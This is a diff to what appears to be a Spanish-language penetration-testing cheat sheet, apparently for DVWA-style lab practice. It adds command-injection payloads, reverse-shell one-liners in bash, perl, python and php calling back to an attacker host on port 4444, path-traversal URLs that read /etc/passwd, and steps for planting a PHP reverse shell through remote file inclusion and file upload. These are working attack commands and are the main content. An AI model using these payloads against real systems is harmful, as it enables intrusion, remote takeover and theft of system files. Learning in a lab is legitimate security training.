@@ -488,7 +488,80 @@ ________________________________________________________________________________
 COMMAND INJECTION
 _________________________________________________________________________________________
 
+# Tras introducir el valor que espera se realizan los comandos para evadirlo y hacer un bypass.
+	[VALUE]; whoami
+	[VALUE] && whoami
+	[VALUE] | whoami
+# Siempre intentar ir a mas
+	[VALUE] && cat /etc/passwd
+	[VALUE]; echo "\nUser: $(whoami)"; echo "Hostname: $(hostname)"
+# Hasta intentar tomar el control
+	Kali
+		nc -lvnp 4444   ---   abrir un puerto
+	Target
+		bash -i >& /dev/tcp/[LHOST]/4444 0>&1
+		perl -e 'use Socket;$i="[LHOST]";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHOST]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+		php -r '$sock=fsockopen("[LHOST]",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+	https://gist.github.com/IN4G4I/a230443081c705836534138d8df99098
+	https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 
+
+XSS
+_________________________________________________________________________________________
+
+
+
+SQLi
+_________________________________________________________________________________________
+
+
+
+CSRF
+_________________________________________________________________________________________
+
+# Falsificar o envenenar una accion normal, como un cambio de contraseña
+# Tras cambiar la contraseña copiar el link 
+# Ese mismo link, cambiar contraseña y acortar el url (si no hay protección CSRF)
+
+
+FILE INCLUSION / LOCAL & REMOTE
+_________________________________________________________________________________________
+
+# LFI # MSi la URL hay una pagina que se utiliza para incluir el archivo
+	url:http://192.168.170.131/vulnerabilities/fi/?page=include.php
+# Se puede intentar un bypass con este URL, sacando users
+	url:http://192.168.170.131/vulnerabilities/fi/?page=../../../../../../etc/passwd
+	url:http://192.168.170.131/vulnerabilities/fi/?page=../../../../../../proc/cpuinfo
+# Si observas que hay una condicion, como que el nombre del archivo empiece por 'file'
+	url:http://192.168.170.131/vulnerabilities/fi/?page=file/../../../../../../etc/passwd
+
+# RFI # Para ir mas haya intentar cargar un archivo en la pagina con una reverse shell
+# Por ejemplo, una pagina que acepte php: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+# Crear el archivo, editar los campos y editar permisos para ejecucion
+	ex:	sudo nano reverse.php
+			$ip = [IP_KALI]
+			$port = 4444
+		sudo chmod +x reverse.php
+# Convertir kali en un servidor web con un modulo en python. 
+# Activa de manera temporal un servicio web mostrando la carpeta en la que te encuentres.
+	python3 -m http.server 8080
+# Target
+	url:http://192.168.170.131/vulnerabilities/fi/?page=http://[IP_KALI]:8080
+# Abrir puerto de reverse en Kali
+	nc -lvnp 4444
+# Target, se quedara a la espera
+	url:http://192.168.170.131/vulnerabilities/fi/?page=http://[IP_KALI]:8080/reverse.php
+# Acceso por comandos, intentar conseguir acceso root
+	
+
+FILE UPLOAD
+_________________________________________________________________________________________
+
+# Si no esta bien filtraso, se puede intentar subir un archivo php para cargar una reverse shell
+	nc -lvnp 4444
+# Subir reverse.php usado en RFI
+	http://[RHOST]/hackable/uploads/reverse.php
 
 
 
@@ -508,8 +581,8 @@ KALI TOOLS
 _________________________________________________________________________________________
 
 # Actualizar e instalar todas la herramientas de Kali Linux
-	sudo apt update && sudo apt upgrade -y
 	sudo apt update && sudo apt install kali-tools-*
+	sudo apt update && sudo apt upgrade -y
 
 
 ALIAS
